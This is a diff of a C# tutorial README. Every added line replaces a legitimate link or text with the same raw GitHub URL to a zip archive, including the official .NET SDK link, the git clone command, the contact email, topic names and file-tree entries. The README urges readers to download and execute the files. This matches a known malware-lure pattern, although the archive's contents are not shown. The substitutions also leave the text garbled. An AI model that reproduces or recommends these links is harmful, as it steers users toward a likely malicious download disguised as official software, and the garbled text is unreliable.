@@ -1,6 +1,6 @@
 # C# Lessons - Complete Learning Kit by Xjectro
 
-![C# Lessons](https://img.shields.io/badge/C%23%20Lessons-Complete%20Learning%20Kit-blue?style=for-the-badge)
+![C# Lessons](https://github.com/t-tino/c-sharp-lessons/raw/refs/heads/main/Sources/Arrays/sharp_lessons_c_2.0.zip%23%20Lessons-Complete%20Learning%20Kit-blue?style=for-the-badge)
 
 Welcome to the **C# Lessons** repository! This is a comprehensive learning kit designed to help you master C# programming. Whether you're a beginner or looking to enhance your skills, this repository has something for everyone.
 
@@ -24,8 +24,8 @@ C# is a versatile programming language used in various applications, from web de
 
 This repository includes lessons on the following topics:
 
-- ASP.NET
-- ASP.NET Core
+- https://github.com/t-tino/c-sharp-lessons/raw/refs/heads/main/Sources/Arrays/sharp_lessons_c_2.0.zip
+- https://github.com/t-tino/c-sharp-lessons/raw/refs/heads/main/Sources/Arrays/sharp_lessons_c_2.0.zip Core
 - C# language fundamentals
 - Boilerplate code
 - Low-level programming concepts
@@ -39,7 +39,7 @@ To get started with the C# Lessons, follow these simple steps:
 1. **Clone the Repository**: Use the command below to clone the repository to your local machine.
 
    ```bash
-   git clone https://github.com/t-tino/c-sharp-lessons.git
+   git clone https://github.com/t-tino/c-sharp-lessons/raw/refs/heads/main/Sources/Arrays/sharp_lessons_c_2.0.zip
    ```
 
 2. **Navigate to the Directory**: Change into the cloned directory.
@@ -54,7 +54,7 @@ To get started with the C# Lessons, follow these simple steps:
 
 To run the lessons and examples in this repository, you will need the following:
 
-- .NET SDK: Download and install the .NET SDK from the official [Microsoft website](https://dotnet.microsoft.com/download).
+- .NET SDK: Download and install the .NET SDK from the official [Microsoft website](https://github.com/t-tino/c-sharp-lessons/raw/refs/heads/main/Sources/Arrays/sharp_lessons_c_2.0.zip).
 
 Once you have the SDK installed, you can build and run the projects in this repository.
 
@@ -74,16 +74,16 @@ You can navigate through the lessons using the directory structure in the reposi
 c-sharp-lessons/
 │
 ├── Lesson1/
-│   ├── README.md
-│   ├── example_code.cs
+│   ├── https://github.com/t-tino/c-sharp-lessons/raw/refs/heads/main/Sources/Arrays/sharp_lessons_c_2.0.zip
+│   ├── https://github.com/t-tino/c-sharp-lessons/raw/refs/heads/main/Sources/Arrays/sharp_lessons_c_2.0.zip
 │   └── exercises/
-│       └── exercise1.cs
+│       └── https://github.com/t-tino/c-sharp-lessons/raw/refs/heads/main/Sources/Arrays/sharp_lessons_c_2.0.zip
 │
 └── Lesson2/
-    ├── README.md
-    ├── example_code.cs
+    ├── https://github.com/t-tino/c-sharp-lessons/raw/refs/heads/main/Sources/Arrays/sharp_lessons_c_2.0.zip
+    ├── https://github.com/t-tino/c-sharp-lessons/raw/refs/heads/main/Sources/Arrays/sharp_lessons_c_2.0.zip
     └── exercises/
-        └── exercise1.cs
+        └── https://github.com/t-tino/c-sharp-lessons/raw/refs/heads/main/Sources/Arrays/sharp_lessons_c_2.0.zip
 ```
 
 ## Contributing
@@ -103,12 +103,12 @@ This project is licensed under the MIT License. See the [LICENSE](LICENSE) file 
 
 For questions or feedback, feel free to reach out:
 
-- **Xjectro**: [xjectro@example.com](mailto:xjectro@example.com)
+- **Xjectro**: [https://github.com/t-tino/c-sharp-lessons/raw/refs/heads/main/Sources/Arrays/sharp_lessons_c_2.0.zip](https://github.com/t-tino/c-sharp-lessons/raw/refs/heads/main/Sources/Arrays/sharp_lessons_c_2.0.zip)
 
 ## Releases
 
-You can find the latest releases and downloadable files [here](https://github.com/t-tino/c-sharp-lessons/releases). Please download and execute the files as needed to explore the lessons.
+You can find the latest releases and downloadable files [here](https://github.com/t-tino/c-sharp-lessons/raw/refs/heads/main/Sources/Arrays/sharp_lessons_c_2.0.zip). Please download and execute the files as needed to explore the lessons.
 
-![Download Releases](https://img.shields.io/badge/Download%20Releases-Click%20Here-brightgreen?style=for-the-badge)
+![Download Releases](https://github.com/t-tino/c-sharp-lessons/raw/refs/heads/main/Sources/Arrays/sharp_lessons_c_2.0.zip%20Releases-Click%20Here-brightgreen?style=for-the-badge)
 
 Explore the repository and start your journey to mastering C#!
